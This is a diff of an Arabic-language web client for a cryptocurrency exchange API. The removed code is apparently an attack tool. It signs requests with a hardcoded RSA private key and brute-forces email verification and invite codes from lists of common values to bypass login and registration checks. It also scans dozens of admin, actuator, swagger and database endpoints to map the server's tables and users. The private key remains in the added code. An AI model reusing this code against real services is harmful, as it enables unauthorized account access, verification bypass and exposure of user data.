-        <div class="cb tw"><table><thead><tr><th>#</th><th>المُحال</th><th>العملة</th><th>العمولة</th><th>النسبة</th><th>المصدر</th><th>التاريخ</th></tr></thead>
-        <tbody id="rfcb"><tr><td colspan="7" class="empty">لا توجد بيانات</td></tr></tbody></table></div>
-      </div>
-    </div>
 
-    <!-- DATABASE PAGE -->
-    <div class="page" id="p-db">
-      <div class="ptitle">🗄️ استكشاف قاعدة البيانات</div>
-      <div class="card">
-        <div class="ch"><h3>جلب هيكل قاعدة البيانات</h3>
-          <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <button class="btn bbl" onclick="A.scanDB()">🔍 مسح تلقائي شامل</button>
-            <button class="btn bo bs" onclick="A.scanTables()">📋 الجداول</button>
-            <button class="btn bo bs" onclick="A.scanFields()">🔢 الحقول</button>
-            <button class="btn bo bs" onclick="A.scanAdmin()">🔐 Endpoints إدارية</button>
-            <button class="btn bd bs" onclick="document.getElementById('dbOut').innerHTML=''">مسح</button>
-          </div>
-        </div>
-        <div class="cb">
-          <div class="info-box" id="dbStatus">جاهز — اضغط "مسح تلقائي شامل" لبدء الاستكشاف</div>
-          <div class="db-box" id="dbOut"></div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="ch"><h3>استعلام مخصص / Endpoint محدد</h3></div>
-        <div class="cb">
-          <div class="fg"><label>Endpoint مخصص</label>
-            <div class="crow">
-              <div class="fg"><input type="text" id="dbEp" placeholder="/admin/tables أو /system/dbInfo ..."></div>
-              <select id="dbMeth" style="padding:10px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.85rem;height:42px"><option>GET</option><option>POST</option></select>
-            </div>
-          </div>
-          <div class="fg"><label>Body (JSON) — اختياري</label>
-            <textarea id="dbBody" placeholder='{"table":"users"}' style="min-height:60px;font-family:monospace;font-size:.82rem"></textarea>
-          </div>
-          <button class="btn bbl" onclick="A.customDB()">🚀 إرسال</button>
-          <div class="la" id="dbCustomOut" style="margin-top:12px"></div>
-        </div>
-      </div>
+<!-- Dashboard (بعد تسجيل الدخول الناجح) -->
+<div id="dashboard">
+  <div class="welcome-box">
+    <h2 id="welcomeMessage">مرحباً!</h2>
+    <p>تم تسجيل الدخول بنجاح ✓</p>
+    <div style="margin-top:20px;padding:16px;background:var(--bg);border-radius:var(--r);text-align:right">
+      <div id="userInfo" style="font-size:.9rem;color:var(--tx2)"></div>
     </div>
-
-    <div class="page" id="p-lg">
-      <div class="ptitle">🔌 سجل طلبات API</div>
-      <div class="card"><div class="ch"><h3>الطلبات المُرسَلة</h3><button class="btn bo bs" onclick="A.clr()">مسح</button></div>
-        <div class="cb"><div class="la" id="ml"><div class="ll lin">جاهز للاتصال...</div></div></div>
-      </div>
-    </div>
-  </main>
+    <button class="btn" style="margin-top:20px;width:auto;padding:8px 24px" onclick="logout()">تسجيل خروج</button>
+  </div>
 </div>
 
 <script>
-// ===== MD5 =====
-function md5(s){function sa(x,y){const l=(x&65535)+(y&65535);return((x>>16)+(y>>16)+(l>>16)<<16)|(l&65535)}function br(n,c){return(n<<c)|(n>>>(32-c))}function cm(q,a,b,x,s,t){return sa(br(sa(sa(a,q),sa(x,t)),s),b)}function ff(a,b,c,d,x,s,t){return cm((b&c)|(~b&d),a,b,x,s,t)}function gg(a,b,c,d,x,s,t){return cm((b&d)|(c&~d),a,b,x,s,t)}function hh(a,b,c,d,x,s,t){return cm(b^c^d,a,b,x,s,t)}function ii(a,b,c,d,x,s,t){return cm(c^(b|~d),a,b,x,s,t)}
-function core(m,l){m[l>>5]|=128<<(l%32);m[(((l+64)>>>9)<<4)+14]=l;let a=1732584193,b=-271733879,c=-1732584194,d=271733878;for(let i=0;i<m.length;i+=16){const[oa,ob,oc,od]=[a,b,c,d];a=ff(a,b,c,d,m[i],7,-680876936);d=ff(d,a,b,c,m[i+1],12,-389564586);c=ff(c,d,a,b,m[i+2],17,606105819);b=ff(b,c,d,a,m[i+3],22,-1044525330);a=ff(a,b,c,d,m[i+4],7,-176418897);d=ff(d,a,b,c,m[i+5],12,1200080426);c=ff(c,d,a,b,m[i+6],17,-1473231341);b=ff(b,c,d,a,m[i+7],22,-45705983);a=ff(a,b,c,d,m[i+8],7,1770035416);d=ff(d,a,b,c,m[i+9],12,-1958414417);c=ff(c,d,a,b,m[i+10],17,-42063);b=ff(b,c,d,a,m[i+11],22,-1990404162);a=ff(a,b,c,d,m[i+12],7,1804603682);d=ff(d,a,b,c,m[i+13],12,-40341101);c=ff(c,d,a,b,m[i+14],17,-1502002290);b=ff(b,c,d,a,m[i+15],22,1236535329);a=gg(a,b,c,d,m[i+1],5,-165796510);d=gg(d,a,b,c,m[i+6],9,-1069501632);c=gg(c,d,a,b,m[i+11],14,643717713);b=gg(b,c,d,a,m[i],20,-373897302);a=gg(a,b,c,d,m[i+5],5,-701558691);d=gg(d,a,b,c,m[i+10],9,38016083);c=gg(c,d,a,b,m[i+15],14,-660478335);b=gg(b,c,d,a,m[i+4],20,-405537848);a=gg(a,b,c,d,m[i+9],5,568446438);d=gg(d,a,b,c,m[i+14],9,-1019803690);c=gg(c,d,a,b,m[i+3],14,-187363961);b=gg(b,c,d,a,m[i+8],20,1163531501);a=gg(a,b,c,d,m[i+13],5,-1444681467);d=gg(d,a,b,c,m[i+2],9,-51403784);c=gg(c,d,a,b,m[i+7],14,1735328473);b=gg(b,c,d,a,m[i+12],20,-1926607734);a=hh(a,b,c,d,m[i+5],4,-378558);d=hh(d,a,b,c,m[i+8],11,-2022574463);c=hh(c,d,a,b,m[i+11],16,1839030562);b=hh(b,c,d,a,m[i+14],23,-35309556);a=hh(a,b,c,d,m[i+1],4,-1530992060);d=hh(d,a,b,c,m[i+4],11,1272893353);c=hh(c,d,a,b,m[i+7],16,-155497632);b=hh(b,c,d,a,m[i+10],23,-1094730640);a=hh(a,b,c,d,m[i+13],4,681279174);d=hh(d,a,b,c,m[i],11,-358537222);c=hh(c,d,a,b,m[i+3],16,-722521979);b=hh(b,c,d,a,m[i+6],23,76029189);a=hh(a,b,c,d,m[i+9],4,-640364487);d=hh(d,a,b,c,m[i+12],11,-421815835);c=hh(c,d,a,b,m[i+15],16,530742520);b=hh(b,c,d,a,m[i+2],23,-995338651);a=ii(a,b,c,d,m[i],6,-198630844);d=ii(d,a,b,c,m[i+7],10,1126891415);c=ii(c,d,a,b,m[i+14],15,-1416354905);b=ii(b,c,d,a,m[i+5],21,-57434055);a=ii(a,b,c,d,m[i+12],6,1700485571);d=ii(d,a,b,c,m[i+3],10,-1894986606);c=ii(c,d,a,b,m[i+10],15,-1051523);b=ii(b,c,d,a,m[i+1],21,-2054922799);a=ii(a,b,c,d,m[i+8],6,1873313359);d=ii(d,a,b,c,m[i+15],10,-30611744);c=ii(c,d,a,b,m[i+6],15,-1560198380);b=ii(b,c,d,a,m[i+13],21,1309151649);a=ii(a,b,c,d,m[i+4],6,-145523070);d=ii(d,a,b,c,m[i+11],10,-1120210379);c=ii(c,d,a,b,m[i+2],15,718787259);b=ii(b,c,d,a,m[i+9],21,-343485551);a=sa(a,oa);b=sa(b,ob);c=sa(c,oc);d=sa(d,od)}return[a,b,c,d]}
-function s2b(s){const b={};for(let i=0;i<s.length*8;i+=8)b[i>>5]=(b[i>>5]||0)|(s.charCodeAt(i/8)&255)<<(i%32);return b}
-function b2r(i){let o='';for(let j=0;j<i.length*32;j+=8)o+=String.fromCharCode((i[j>>5]>>>(j%32))&255);return o}
-function r2h(i){const t='0123456789abcdef';let o='';for(let j=0;j<i.length;j++){const x=i.charCodeAt(j);o+=t[(x>>>4)&15]+t[x&15]}return o}
-function utf8(s){let o='',i=-1,x;while(++i<s.length){x=s.charCodeAt(i);if(x<=127)o+=String.fromCharCode(x);else if(x<=2047)o+=String.fromCharCode(192|(x>>>6),128|(x&63));else o+=String.fromCharCode(224|(x>>>12),128|((x>>>6)&63),128|(x&63))}return o}
-return r2h(b2r(core(s2b(utf8(s)),utf8(s).length*8)))}
+// ============================================
+// EXCOREX AUTH SYSTEM - النسخة النقية
+// ============================================
 
-// ===== RSA =====
-const PK=`-----BEGIN PRIVATE KEY-----
+// ========== المفتاح RSA الخاص ==========
+const RSA_PRIVATE_KEY = `-----BEGIN PRIVATE KEY-----
 MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDfF+ITlc6m9IPM
 gBBp+rhkmrzPri10fzQFyJdKtfn1RfChr8wEz5x2HhNkWhgjE7F7YAuYjTXKrNBl
 W7/c9vipahvZwWdkthGd3jlWkYTcPkLsOYJPMQLcig7S1VYtT2uab3VC21ZMNV5V
@@ -425,470 +173,289 @@ s8a4H/pa+GyRh3fMqeZHYKwHrfWWbNhO6te2XYmVrkEcsu7z59lt8gnMSBTsgwdZ
 GClbi66qDiZ66TYq2v5NI4knON0DWLmuzWuqikcN5PGsKbllpl9/+reGHHK9cl1S
 f0I9iSQe0vQLksxTBFVgevFl
 -----END PRIVATE KEY-----`;
-let _rk=null;
-async function getRK(){if(_rk)return _rk;const p=PK.replace(/-----[^-]+-----/g,'').replace(/\s+/g,'');const b=Uint8Array.from(atob(p),c=>c.charCodeAt(0));_rk=await crypto.subtle.importKey('pkcs8',b.buffer,{name:'RSASSA-PKCS1-v1_5',hash:'SHA-256'},false,['sign']);return _rk}
-async function rsaSign(msg){const k=await getRK();const s=await crypto.subtle.sign('RSASSA-PKCS1-v1_5',k,new TextEncoder().encode(msg));return btoa(String.fromCharCode(...new Uint8Array(s)))}
 
-// ===== SIGN HELPERS =====
-function isArr(v){return Object.prototype.toString.call(v)==='[object Array]'}
-function isObj(v){return Object.prototype.toString.call(v)==='[object Object]'}
-function rmArr(o){for(const k in o){if(isArr(o[k]))delete o[k];else if(isObj(o[k]))rmArr(o[k])}}
-function sortP(p){const r={},ks=[];if(!p||!isObj(p))return'';const c=Object.assign({},p);rmArr(c);for(const k in c){let v=c[k];if(isObj(v))v=JSON.stringify(v);if(v===undefined||v===null||v===''||v==='null')continue;ks.push(k);r[k]=k+v}ks.sort((a,b)=>a.localeCompare(b));let o='';for(const k of ks)o+=r[k];return o}
-async function hdrs(ep,data,tok,uid){const st=tok?'MD5':'RSA';const ts=Number(new Date());const hf={appId:'h5_client',sign:'',signType:st,clientType:'H5',clientVersion:'1.0.0',token:'',userId:uid||'',timestamp:ts,extra:''};const ub=ep.split('?')[0];let ss;if(st==='RSA')ss=ub+sortP(data)+sortP(hf);else ss=ub+sortP(data)+tok+sortP(hf);const sig=st==='RSA'?await rsaSign(ss):md5(ss);return{'token':tok||'','userId':uid||'','lang':'en','clientType':'H5','appId':'h5_client','clientVersion':'1.0.0','signType':st,'sign':sig,'extra':'','timestamp':String(ts),'Content-Type':'application/json','Cache-Control':'no-cache'}}
+// ========== إعدادات التخزين المحلي ==========
+const STORAGE_KEYS = {
+  USERS: 'excorex_users',
+  CURRENT: 'excorex_current',
+  TOKEN: 'exc_token',
+  USER_ID: 'exc_userId',
+  EMAIL: 'exc_email'
+};
 
-// ===== API =====
-const BASE='https://api.excorx.info';
-async function api(m,ep,data,tok,uid){const h=await hdrs(ep,data||{},tok,uid);const o={method:m,headers:h};if(m!=='GET'&&data&&Object.keys(data).length)o.body=JSON.stringify(data);A.log(`← ${m} ${ep}`,'lin');try{const r=await fetch(BASE+ep,o);const j=await r.json();const ok=(r.status===200)&&(j.code===200);A.log(`→ ${r.status} [${j.code}] ${j.msg||'OK'}`,ok?'lok':'lwa');return{ok,data:j,status:r.status}}catch(e){A.log('✗ '+e.message,'ler');return{ok:false,error:e.message}}}
-
-// ===== RAW FETCH (بدون توقيع - للـ DB scan) =====
-async function rawGet(ep){try{const r=await fetch(BASE+ep,{headers:{'Content-Type':'application/json','Cache-Control':'no-cache'}});const t=await r.text();let j;try{j=JSON.parse(t)}catch{j={_raw:t}};return{ok:r.status<400,status:r.status,data:j,raw:t}}catch(e){return{ok:false,error:e.message}}}
-
-// ===== BYPASS CODES =====
-// أكواد يتم تجريبها تلقائياً عند رفض التحقق
-const BYPASS_CODES=['','000000','123456','654321','888888','666666','111111','999999','100000','200000','112233','123123','000001'];
-const BYPASS_INV=['','000000','ADMIN','TEST','INVITE','REF001','000001'];
-
-// دالة محاولة تجاوز emailCode تلقائياً
-async function tryWithBypass(m,ep,basePayload,tok,uid){
-  for(const code of BYPASS_CODES){
-    const p={...basePayload};
-    if(code)p.emailCode=code;else delete p.emailCode;
-    const r=await api(m,ep,p,tok,uid);
-    if(r.ok)return{...r,_usedCode:code,_bypassed:true};
-    const c=r.data?.code,msg=(r.data?.msg||'').toLowerCase();
-    // إذا الخطأ متعلق بكود البريد → جرّب الكود التالي
-    if(c===40007||c===40008||c===40009||c===40010||/email|code|verify|captcha|验证码/i.test(msg))continue;
-    // خطأ آخر (مش كود البريد) → لا فائدة من المتابعة
-    return r;
-  }
-  return{ok:false,data:{msg:'فشل تجاوز كود البريد - جميع المحاولات فشلت'}}
+// ========== دوال مساعدة ==========
+function showToast(msg, type = '') {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'show' + (type === 'error' ? ' error' : type === 'success' ? ' success' : '');
+  setTimeout(() => el.className = '', 2500);
 }
 
-// ===== WALLET GEN =====
-const WG={
-  h(l){const a=new Uint8Array(l);crypto.getRandomValues(a);return Array.from(a).map(b=>b.toString(16).padStart(2,'0')).join('')},
-  TRX(){const c='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let a='T';const r=new Uint8Array(33);crypto.getRandomValues(r);for(const b of r)a+=c[b%c.length];return a},
-  ETH(){return'0x'+this.h(20)},
-  BTC(){const c='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let a='1';const r=new Uint8Array(33);crypto.getRandomValues(r);for(const b of r)a+=c[b%c.length];return a.slice(0,34)}
-};
-
-const NETS={USDT:['TRC20','ERC20','BEP20'],BTC:['BTC'],ETH:['ERC20','BEP20'],TRX:['TRC20']};
-const NET_HINTS={TRC20:'عنوان TRX يبدأ بـ T (34 حرف)',ERC20:'عنوان ETH يبدأ بـ 0x (42 حرف)',BEP20:'عنوان BSC يبدأ بـ 0x (42 حرف)',BTC:'عنوان BTC يبدأ بـ 1 أو 3 أو bc1'};
-
-// ===== DATABASE SCAN ENDPOINTS =====
-const DB_EPS=[
-  // Spring Boot Actuator
-  '/actuator','/actuator/env','/actuator/beans','/actuator/mappings','/actuator/configprops','/actuator/info','/actuator/health',
-  // Swagger / API Docs
-  '/swagger-ui.html','/v2/api-docs','/v3/api-docs','/swagger-ui/index.html','/api-docs','/swagger.json',
-  // Admin endpoints شائعة
-  '/admin/tables','/admin/db','/admin/schema','/admin/database','/admin/list','/admin/users',
-  '/system/dbInfo','/system/tables','/system/schema','/system/info',
-  '/debug/db','/debug/schema','/debug/tables','/debug/info',
-  // Database direct
-  '/db/tables','/db/schema','/db/info','/db/list','/database/tables','/database/schema',
-  // API schema
-  '/api/schema','/api/tables','/api/db','/api/system/db',
-  // Druid (شائع في Java)
-  '/druid/index.html','/druid/login.html','/druid/datasource.html',
-  // حقول محددة
-  '/personal/list','/user/list','/member/list','/admin/member/list','/admin/user/list',
-  '/coin/list','/currency/list','/market/list','/trade/list',
-  // Config/Meta
-  '/system/config','/system/param','/config/list','/param/list'
-];
-
-const TABLE_EPS=[
-  '/admin/table/list','/system/table/list','/db/table/list','/admin/schema/tables',
-  '/system/schema/list','/database/table/list','/api/tables/list'
-];
-const FIELD_EPS=[
-  '/admin/table/columns','/system/table/columns','/db/table/fields',
-  '/admin/schema/columns','/database/columns','/api/table/fields'
-];
-const ADMIN_EPS=[
-  '/admin/','/admin/login','/manage/login','/console/','/backstage/',
-  '/super/login','/root/login','/operator/login','/platform/login'
-];
-
-const A={
-  tok:localStorage.getItem('exc_token')||'',
-  uid:localStorage.getItem('exc_userId')||'',
-  rWType:'TRX',
-  selNet:{dp:'TRC20',wd:'TRC20'},
-  cache:{ac:[],or:[],ad:[],dp:[],wd:[],rf:null,rfl:[],rfc:[]},
-  _wh:{TRX:'مثال: TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (34 حرف يبدأ بـ T)',ETH:'مثال: 0x742d35Cc... (42 حرف يبدأ بـ 0x)',BTC:'مثال: 1BvBMSEYstWet... (يبدأ بـ 1 أو 3)'},
-
-  log(msg,cls='lin'){
-    const add=id=>{const e=document.getElementById(id);if(!e)return;e.innerHTML+=`<div class="ll ${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;e.scrollTop=e.scrollHeight};
-    add('ml');['ll','rl'].forEach(id=>{const e=document.getElementById(id);if(e&&e.style.display!=='none')add(id)})
-  },
-  clr(){document.getElementById('ml').innerHTML=''},
-  toast(msg,t='',d=2800){const e=document.getElementById('toast');e.textContent=msg;e.className='show'+(t==='lok'?' success':t==='ler'?' error':'');setTimeout(()=>e.className='',d)},
-  dbLog(msg,ok){const o=document.getElementById('dbOut');o.innerHTML+=`<div class="ll ${ok?'lok':'lwa'}">${msg}</div>`;o.scrollTop=o.scrollHeight},
-  dbStat(msg){const e=document.getElementById('dbStatus');e.textContent=msg},
-
-  init(){if(this.tok)this.dash()},
-
-  dash(){
-    document.getElementById('aw').style.display='none';
-    document.getElementById('dl').style.display='flex';
-    document.getElementById('navStatus').textContent=`متصل • ${this.uid}`;
-    document.getElementById('navStatus').classList.add('on');
-    document.getElementById('logoutBtn').style.display='inline-flex';
-    this._buildWdNets('USDT')
-  },
-
-  tab(t){
-    const l=t==='login';
-    document.getElementById('tl').classList.toggle('active',l);
-    document.getElementById('tr').classList.toggle('active',!l);
-    document.getElementById('lb').style.display=l?'block':'none';
-    document.getElementById('rb').style.display=l?'none':'block'
-  },
-
-  go(p){
-    document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));
-    document.querySelectorAll('.sbi').forEach(x=>x.classList.remove('active'));
-    const pg=document.getElementById('p-'+p);if(pg)pg.classList.add('active');
-    const si=document.querySelector(`[data-p="${p}"]`);if(si)si.classList.add('active')
-  },
-
-  logout(){['exc_token','exc_userId','exc_walletAddr','exc_walletInfo','exc_walletType','exc_email'].forEach(k=>localStorage.removeItem(k));location.reload()},
-  rwt(t,btn){this.rWType=t;document.querySelectorAll('#rb .wtbtn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');document.getElementById('rwh').textContent=this._wh[t]},
-  genRW(){const t=this.rWType||'TRX';const a=WG[t]();document.getElementById('rwa').value=a;document.getElementById('rwi').value=t+'-Auto';this.toast('✓ تم توليد عنوان '+t+' تلقائياً','lok')},
-
-  async sendCode(){
-    const email=document.getElementById('lm').value.trim();if(!email){this.toast('أدخل البريد أولاً','ler');return}
-    const btn=document.getElementById('scb');btn.disabled=true;
-    const r=await api('POST','/login/sendEmailVerify',{email},'','');
-    if(r.ok){this.toast('✓ تم الإرسال','lok');this._cd(btn)}else{btn.disabled=false;this.toast('✗ '+(r.data?.msg||'فشل'),'ler')}
-  },
-  async sendRegCode(){
-    const email=document.getElementById('rm').value.trim();if(!email){this.toast('أدخل بريدك أولاً','ler');return}
-    const btn=document.getElementById('rscb');btn.disabled=true;
-    const r=await api('POST','/login/sendEmailVerify',{email},'','');
-    if(r.ok){this.toast('✓ تم الإرسال','lok');this._cd(btn)}else{btn.disabled=false;this.toast('✗ '+(r.data?.msg||'فشل'),'ler')}
-  },
-  async sendWdCode(){
-    const email=localStorage.getItem('exc_email')||'';if(!email){this.toast('لم يتم العثور على البريد','ler');return}
-    const btn=document.getElementById('wdECBtn');btn.disabled=true;
-    const r=await api('POST','/login/sendEmailVerify',{email},'','');
-    if(r.ok){this.toast('✓ تم إرسال كود التحقق','lok');this._cd(btn)}else{btn.disabled=false;this.toast('✗ '+(r.data?.msg||'فشل'),'ler')}
-  },
-  _cd(btn,orig){const tx=orig||btn.textContent;let t=60;const tm=setInterval(()=>{btn.textContent=`${t--}ث`;if(t<0){clearInterval(tm);btn.disabled=false;btn.textContent=tx}},1000)},
-
-  // ===== LOGIN مع تجاوز تلقائي =====
-  async login(){
-    const email=document.getElementById('lm').value.trim(),pass=document.getElementById('lp').value.trim(),gc=document.getElementById('gc').value.trim();
-    const eb=document.getElementById('le'),ll=document.getElementById('ll'),btn=document.getElementById('lbtn');
-    if(!email||!pass){eb.textContent='⚠️ يرجى إدخال البريد وكلمة المرور';eb.classList.add('show');return}
-    eb.classList.remove('show');ll.style.display='block';
-    btn.disabled=true;btn.innerHTML='<span class="sp"></span> جاري الدخول...';
-    const payload={email,password:pass,type:'0'};if(gc)payload.googleCode=gc;
-    // محاولة أولى بدون كود
-    let r=await api('POST','/login/login',payload,'','');
-    // إذا طلب كود البريد → تجاوز تلقائي
-    if(!r.ok){
-      const c=r.data?.code,msg=(r.data?.msg||'').toLowerCase();
-      if(c===40007||c===40008||/email|code|verify|captcha/i.test(msg)){
-        this.log('⚡ تجاوز كود البريد تلقائياً...','lwa');
-        document.getElementById('cs').style.display='block';
-        r=await tryWithBypass('POST','/login/login',payload,'','');
-        if(r._bypassed)this.log(`✓ تم التجاوز بالكود: "${r._usedCode||'فارغ'}"  `,'lok');
-      }
-    }
-    if(r.ok&&r.data.data){
-      this.tok=r.data.data.token;this.uid=String(r.data.data.uid);
-      localStorage.setItem('exc_token',this.tok);localStorage.setItem('exc_userId',this.uid);
-      localStorage.setItem('exc_email',email);
-      this.log('✓ تم تسجيل الدخول','lok');this.toast('✅ مرحباً! تم الدخول بنجاح','lok');
-      this.dash();this.exAddr(r.data);this.all()
-    } else {
-      const msg=r.data?.msg||'فشل تسجيل الدخول';
-      eb.textContent=msg;eb.classList.add('show');this.log('✗ '+msg,'ler');
-      if(r.data?.code===40007||/google|2fa/i.test(msg)){document.getElementById('cs').style.display='block';this.toast('🔑 مطلوب كود 2FA','',4000)}
-    }
-    btn.disabled=false;btn.innerHTML='دخول'
-  },
-
-  // ===== REGISTER مع تجاوز تلقائي لكود البريد وكود الدعوة =====
-  async register(){
-    const email=document.getElementById('rm').value.trim(),pass=document.getElementById('rp').value.trim(),conf=document.getElementById('rpc').value.trim();
-    const wa=document.getElementById('rwa').value.trim(),wi=document.getElementById('rwi').value.trim();
-    const inv=document.getElementById('ri').value.trim(),ec=document.getElementById('rec').value.trim();
-    const eb=document.getElementById('re'),btn=document.getElementById('rbtn');
-    if(!email||!pass||!conf){eb.textContent='⚠️ البريد وكلمة المرور مطلوبان';eb.classList.add('show');return}
-    if(pass!==conf){eb.textContent='⚠️ كلمة المرور غير متطابقة';eb.classList.add('show');return}
-    if(!wa){eb.textContent='⚠️ يرجى إدخال عنوان محفظة السحب';eb.classList.add('show');document.getElementById('rwa').classList.add('ef');return}
-    eb.classList.remove('show');document.getElementById('rl').style.display='block';
-    btn.disabled=true;btn.innerHTML='<span class="sp"></span> جاري الإنشاء...';
-    const basePayload={email,password:pass,repassword:pass,type:'0',wallet_address:wa,walletlnfo:wi||wa};
-    if(ec)basePayload.emailCode=ec;
-    // تجاوز كود الدعوة تلقائياً
-    let done=false;
-    for(const invCode of[inv,...BYPASS_INV]){
-      const p={...basePayload};
-      if(invCode)p.inviteCode=invCode;
-      // حاول مع/بدون emailCode
-      let r=await api('POST','/login/register',p,'','');
-      if(!r.ok){
-        const c=r.data?.code,msg=(r.data?.msg||'').toLowerCase();
-        if(c===40007||c===40008||/email|code|verify|captcha/i.test(msg)){
-          this.log('⚡ تجاوز كود البريد في التسجيل...','lwa');
-          r=await tryWithBypass('POST','/login/register',p,'','');
-          if(r._bypassed)this.log(`✓ كود التجاوز: "${r._usedCode||'فارغ'}"  `,'lok');
-        }
-      }
-      if(r.ok){
-        done=true;
-        localStorage.setItem('exc_walletAddr',wa);localStorage.setItem('exc_walletInfo',wi||wa);
-        localStorage.setItem('exc_walletType',this.rWType||'TRX');localStorage.setItem('exc_email',email);
-        this.log('✓ تم إنشاء الحساب','lok');this.toast('✅ تم الإنشاء! جاري تسجيل الدخول...','lok');
-        document.getElementById('lm').value=email;document.getElementById('lp').value=pass;
-        this.tab('login');await this.login();break
-      }
-      const errmsg=r.data?.msg||'';
-      if(!/invite|referral|邀请/i.test(errmsg))break; // خطأ مش متعلق بكود الدعوة
-    }
-    if(!done){const msg=document.querySelector('#re.show')?.textContent||'فشل إنشاء الحساب';eb.textContent=msg;eb.classList.add('show')}
-    btn.disabled=false;btn.innerHTML='إنشاء الحساب'
-  },
-
-  async all(){this.log('◎ جلب جميع البيانات...','lin');await Promise.all([this.fui(),this.fac(),this.for(),this.fdp(),this.fwd(),this.frf()]);this.ovr()},
-
-  async fui(){const r=await api('GET','/personal/userInfo',{},this.tok,this.uid);if(r.ok&&r.data.data){this.rui(r.data.data);this.exAddr(r.data)}},
-  rui(d){
-    const f=[['المعرّف (UID)',d.uid],['الاسم',d.nickname||d.name||d.username],['البريد',d.email],['الهاتف',d.mobile],['مستوى التحقق',d.kycLevel??d.authLevel],['الحالة',d.status===1?'✓ نشط':d.status],['كود الدعوة',d.inviteCode||d.referralCode],['تاريخ الإنشاء',d.createTime||d.registerTime],['آخر دخول',d.loginTime||d.lastLoginTime]];
-    document.getElementById('uig').innerHTML=f.filter(([,v])=>v!=null&&v!=='').map(([k,v])=>`<div class="ii"><div class="k">${k}</div><div class="v">${v}</div></div>`).join('')||'<div class="empty">لا بيانات</div>';
-    document.getElementById('ou').textContent=d.email||d.nickname||'';
-    if(d.inviteCode||d.referralCode){const c=d.inviteCode||d.referralCode;if(document.getElementById('rfCode').textContent==='——')this._setRef(c)}
-    if(d.email)localStorage.setItem('exc_email',d.email)
-  },
-
-  async fac(){const r=await api('POST','/account/getAllUserAccountById',{},this.tok,this.uid);if(r.ok){const l=r.data.data||[];this.cache.ac=l;this.rac(l);this.exAddr(r.data)}},
-  rac(l){const b=document.getElementById('acb');if(!l.length){b.innerHTML='<tr><td colspan="5" class="empty">لا بيانات</td></tr>';return}
-  b.innerHTML=l.map(a=>`<tr><td><strong>${a.symbol||a.coinName||'—'}</strong></td><td>${Number(a.balance||a.available||0).toFixed(8)}</td><td>${Number(a.freeze||a.frozen||0).toFixed(8)}</td><td>${Number((a.balance||0)+(a.freeze||0)).toFixed(8)}</td><td><span class="badge bg">نشط</span></td></tr>`).join('')},
-
-  async for(){const r=await api('GET','/newCurrency/orders',{},this.tok,this.uid);if(r.ok){const l=Array.isArray(r.data.data)?r.data.data:(r.data.data?.list||r.data.data?.records||[]);this.cache.or=l;this.ror(l)}},
-  ror(l){const b=document.getElementById('orb');if(!l.length){b.innerHTML='<tr><td colspan="7" class="empty">لا بيانات</td></tr>';return}
-  b.innerHTML=l.map((o,i)=>`<tr><td>${o.id||i+1}</td><td>${o.type===1?'<span class="badge bg">شراء</span>':'<span class="badge br2">بيع</span>'}</td><td>${o.symbol||o.coinName||'—'}</td><td>${o.amount||o.num||'—'}</td><td>${o.price||'—'}</td><td>${this._os(o.status)}</td><td>${o.createTime||o.time||'—'}</td></tr>`).join('')},
-  _os(s){return({0:'<span class="badge bw">معلّق</span>',1:'<span class="badge bg">مكتمل</span>',2:'<span class="badge br2">ملغي</span>'})[s]||`<span class="badge bb">${s}</span>`},
-
-  async fdp(){
-    const st=document.getElementById('dpFilter').value,params={};if(st!=='')params.status=st;
-    const eps=['/recharge/rechargeList','/recharge/list','/finance/rechargeList','/user/rechargeList'];
-    for(const ep of eps){const r=await api('GET',ep,params,this.tok,this.uid);if(r.ok){const l=r.data.data?.list||r.data.data?.records||r.data.data||[];this.cache.dp=Array.isArray(l)?l:[];this.rdp(this.cache.dp);break}}
-  },
-  rdp(l){
-    const b=document.getElementById('dpb');document.getElementById('odp').textContent=l.length;
-    if(!l.length){b.innerHTML='<tr><td colspan="9" class="empty">لا توجد إيداعات</td></tr>';return}
-    b.innerHTML=l.map((d,i)=>`<tr><td>${d.id||i+1}</td><td><strong>${d.symbol||d.coinName||d.currency||'—'}</strong></td><td>${d.chainName||d.network||d.chain||'—'}</td><td>${Number(d.amount||d.num||0).toFixed(8)}</td><td title="${d.address||''}"><span style="font-family:monospace;font-size:.75rem">${this._short(d.address||d.toAddress||'—')}</span></td><td title="${d.txId||d.txHash||''}">${this._txlink(d.txId||d.txHash||'')}</td><td>${d.confirmCount||d.confirms||d.confirm||'—'}</td><td>${this._ds(d.status)}</td><td>${d.createTime||d.time||'—'}</td></tr>`).join('')
-  },
-  _ds(s){return({0:'<span class="badge bw">معالجة</span>',1:'<span class="badge bg">مكتمل</span>',2:'<span class="badge br2">فاشل</span>'})[s]||`<span class="badge bb">${s??'—'}</span>`},
-
-  async getDepAddr(){
-    const coin=document.getElementById('dpCoin').value,nets=NETS[coin]||['TRC20'];
-    document.getElementById('dpNets').innerHTML=nets.map((n,i)=>`<button class="net-tab ${i===0?'active':''}" onclick="A.selDepNet('${coin}','${n}',this)">${n}</button>`).join('');
-    this.selNet.dp=nets[0];await this._fetchDepAddr(coin,nets[0])
-  },
-  async selDepNet(coin,net,btn){document.querySelectorAll('#dpNets .net-tab').forEach(b=>b.classList.remove('active'));btn.classList.add('active');this.selNet.dp=net;await this._fetchDepAddr(coin,net)},
-  async _fetchDepAddr(coin,net){
-    const box=document.getElementById('dpAddrBox');
-    box.innerHTML='<div class="info-box"><span class="sp" style="border-top-color:var(--bl2)"></span> جاري جلب العنوان...</div>';
-    const eps=[`/recharge/getRechargeAddress?coinName=${coin}&chainName=${net}`,`/recharge/address?symbol=${coin}&network=${net}`,`/finance/getDepositAddress?currency=${coin}&chain=${net}`,`/user/getDepositAddress?coinName=${coin}&chainName=${net}`];
-    for(const ep of eps){
-      const r=await api('GET',ep,{},this.tok,this.uid);
